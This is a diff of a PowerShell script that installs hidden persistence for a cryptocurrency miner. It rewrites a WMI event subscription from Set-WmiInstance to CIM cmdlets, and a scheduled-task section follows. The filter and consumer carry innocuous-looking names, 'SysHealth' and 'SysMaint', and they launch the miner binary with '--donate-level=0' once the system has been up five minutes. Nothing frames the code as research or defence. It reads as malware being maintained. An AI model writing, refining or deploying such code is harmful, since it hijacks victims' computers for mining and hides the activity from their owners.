@@ -60,34 +60,24 @@ Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer |
     Remove-WmiObject -ErrorAction SilentlyContinue
 
 # WMI Subscription
-try {
-    $wmiFilterQuery = @"
-    SELECT * FROM __InstanceModificationEvent WITHIN 60 
-    WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' 
-    AND TargetInstance.SystemUpTime >= 300
-"@
-
-    $filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
-        Name = "SysHealth_$((Get-Date).Ticks)"
-        EventNamespace = 'root\cimv2'  # Critical fix
-        Query = $wmiFilterQuery
-        QueryLanguage = "WQL"
-    }
-
-    $consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
-        Name = "SysMaint_$((Get-Date).Ticks)"
-        CommandLineTemplate = "`"$minerHome\$minerBinary`" --donate-level=0"
-    }
-
-    $binding = Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
-        Filter = $filter.__PATH
-        Consumer = $consumer.__PATH
-    }
-}
-catch {
-    Write-Warning "WMI persistence failed: $($_.Exception.Message)"
+# Replace Set-WmiInstance with CIM cmdlets
+$filter = New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property @{
+    Name           = "SysHealth_$((Get-Date).Ticks)"
+    EventNamespace = 'root/cimv2'
+    Query          = $wmiQuery
+    QueryLanguage  = 'WQL'
 }
 
+$consumer = New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property @{
+    Name                = "SysMaint_$((Get-Date).Ticks)"
+    CommandLineTemplate = "`"$destinationPath`" --donate-level=0"
+    RunInteractively    = $false
+}
+
+$binding = New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property @{
+    Filter   = $filter
+    Consumer = $consumer
+}
 # Scheduled Task
 try {
     $taskSettings = New-ScheduledTaskSettingsSet `
